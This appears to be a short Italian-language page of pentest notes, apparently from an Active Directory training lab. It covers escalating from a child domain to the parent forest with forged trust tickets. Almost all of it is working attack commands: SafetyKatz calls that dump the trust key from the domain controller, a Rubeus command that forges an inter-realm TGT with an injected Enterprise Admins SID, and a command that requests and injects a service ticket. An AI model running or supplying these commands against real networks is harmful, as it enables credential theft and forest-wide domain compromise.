# Priv Esc - Child to Parent using Trust TIckets

#### Recupero trust key per Trust Tickets

* Per poter forgiare un trust ticket abbiamo bisogno della trust key (child-parent) presente sul DC

```powershell
SafetyKatz.exe "lsadump::trust /patch"
```

oppure

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
```

oppure

```powershell
SafetyKatz.exe "lsadump::lsa /patch"
```

#### Creazione TGT Inter-realm&#x20;

```powershell
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
/rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-
719815819-3726368948-3917688648 /sids:S-1-5-21-
335606122-960912869-3279953914-519 /ldap
/user:Administrator /nowrap
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Utilizzo TGT inter-realm

```powershell
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL
/dc:mcorp-dc.MONEYCORP.LOCAL /ptt
/ticket:<FORGED TICKET>
```
